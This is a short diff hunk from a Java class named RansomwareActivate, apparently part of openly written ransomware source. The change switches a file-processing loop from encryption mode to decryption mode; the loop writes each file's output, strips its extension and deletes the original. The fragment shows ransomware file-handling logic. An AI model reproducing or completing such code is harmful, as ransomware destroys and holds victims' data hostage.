@@ -91,10 +91,10 @@ class RansomwareActivate{
 		}
 		for(Path file:fileNames){
 			try{
-				System.out.println("Encrypting file: "+file.toString());
+				System.out.println("Decrypting file: "+file.toString());
 				String inputFile = file.toString();
 				String outputFile = inputFile.substring(0, inputFile.lastIndexOf('.'));
-				sec.decryptFiles(Cipher.ENCRYPT_MODE, kp.getPrivate(), inputFile,outputFile);
+				sec.decryptFiles(Cipher.DECRYPT_MODE, kp.getPrivate(), inputFile,outputFile);
 				File f = new File(inputFile);
 				f.delete();
 			}
